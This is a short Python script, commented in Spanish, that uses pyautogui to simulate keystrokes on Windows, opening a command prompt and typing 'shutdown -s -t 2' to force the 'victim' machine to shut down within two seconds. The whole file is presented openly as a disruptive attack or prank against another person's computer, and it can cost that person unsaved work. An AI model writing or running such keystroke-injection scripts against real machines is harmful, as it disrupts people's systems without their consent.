# Abre terminal en Windows y apaga la maquina victima

import pyautogui
import time

pyautogui.press("win")
time.sleep(1.5)

pyautogui.write("cmd")
pyautogui.press("enter")

time.sleep(2)

pyautogui.write("shutdown -s -t 2") 
pyautogui.press("enter")